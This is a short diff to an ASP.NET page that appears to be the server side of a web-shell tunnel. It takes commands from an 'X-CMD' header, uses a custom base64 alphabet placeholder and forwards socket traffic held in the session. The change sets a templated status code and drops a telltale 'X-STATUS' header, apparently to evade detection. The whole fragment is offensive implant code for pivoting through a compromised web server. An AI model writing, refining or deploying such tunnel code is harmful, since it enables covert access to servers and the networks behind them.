@@ -18,6 +18,7 @@
 <%
     try
     {
+        Response.StatusCode = HTTPCODE;
         String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
         String de = "BASE64 CHARSLIST";
         String cmd = Request.Headers.Get("X-CMD");
@@ -48,7 +49,6 @@
                 } catch (Exception ex){
                 }
                 Session.Remove(mark);
-                Response.AddHeader("X-STATUS", "OK");
             } else if (cmd == "FORWARD") {
                 Socket s = (Socket)Session[mark];
                 try {
